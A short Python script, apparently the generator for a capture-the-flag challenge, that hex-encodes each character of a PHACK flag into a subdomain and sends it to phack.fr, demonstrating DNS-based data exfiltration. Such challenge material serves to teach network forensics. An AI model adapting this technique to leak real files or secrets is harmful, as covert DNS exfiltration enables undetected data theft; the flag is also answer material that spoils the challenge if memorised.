#! /usr/bin/python3

import binascii
import requests
import time
import json
import random

FLAG = "+*-/++/*-/___  PHACK{3xf1ltR4ti0n_thRoUgh_dNs}  ___+/*-+/*-/+."
count = 0

for c in FLAG:
    count += 1

    json_data = json.dumps({"index" : str(count), "data": c})
    encoded = binascii.hexlify(json_data.encode("utf-8")).decode("utf-8")

    url = "http://" + encoded + ".phack.fr"
    print(str(count) + "/" + str(len(FLAG)) + " -- " + url)

    try:
        requests.get(url)
    except:
        pass

    time.sleep(1)
